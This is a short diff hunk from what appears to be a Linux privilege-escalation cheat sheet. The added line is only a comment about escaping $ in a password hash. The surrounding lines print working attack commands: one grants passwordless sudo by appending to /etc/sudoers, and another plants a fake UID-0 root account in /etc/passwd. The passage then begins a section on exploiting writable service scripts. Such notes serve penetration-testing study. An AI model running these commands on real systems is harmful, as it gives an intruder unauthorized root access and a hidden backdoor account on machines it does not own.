@@ -605,6 +605,7 @@ echo "CURRENT_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 openssl passwd 123
 #append the new user to /etc/passwd in such format 
 echo "Fakeuser:${HASH}:0:0:root:/root:/bin/bash" >> /etc/passwd
+# if there is a $ in the hash, you might have to escape it with \
 ```
 ### Modifiable service script exploit
 If a service script (.service file or the script used in `ExecStart`) is writable,
